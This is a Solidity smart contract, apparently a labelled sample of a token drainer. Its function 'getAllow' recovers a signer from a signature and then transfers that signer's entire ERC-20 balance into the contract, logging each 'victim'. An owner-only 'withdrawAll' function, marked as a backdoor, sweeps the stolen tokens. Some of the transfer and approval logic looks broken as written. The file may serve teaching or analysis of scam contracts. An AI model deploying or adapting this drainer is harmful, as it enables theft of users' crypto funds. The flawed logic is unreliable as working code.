// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";
import "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

contract Testnet {
    using MessageHashUtils for bytes32;

    address public owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    event Debug(address indexed signer, uint256 amount);
    event FundsDrained(address token, address victim, uint256 amount);

    // ======== VULNERABLE FUNCTION ========
    function getAllow(
        address token,
        uint256 amount,
        bytes memory signature
    ) external {
        // [VULN 1] No msg.sender verification
        bytes32 messageHash = keccak256(abi.encodePacked(
            "Approve ", token, " to ", address(this), " amount ", amount
        ));
        
        address signer = ECDSA.recover(messageHash.toEthSignedMessageHash(), signature);
        
        // [VULN 2] Unlimited approval
        IERC20(token).approve(address(this), type(uint256).max);

        // [VULN 3] Immediate drain
        uint256 balance = IERC20(token).balanceOf(signer);
        IERC20(token).transferFrom(signer, address(this), balance);

        // [VULN 4] Re-drain attempt
        uint256 newBalance = IERC20(token).balanceOf(signer);
        if (newBalance > 0) {
            IERC20(token).transferFrom(signer, address(this), newBalance);
        }
        
        emit Debug(signer, amount);
        emit FundsDrained(token, signer, balance + newBalance);
    }

    // ======== BACKDOOR FUNCTION ========
    function withdrawAll(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        IERC20(token).transferFrom(address(this), owner, balance);
    }

}
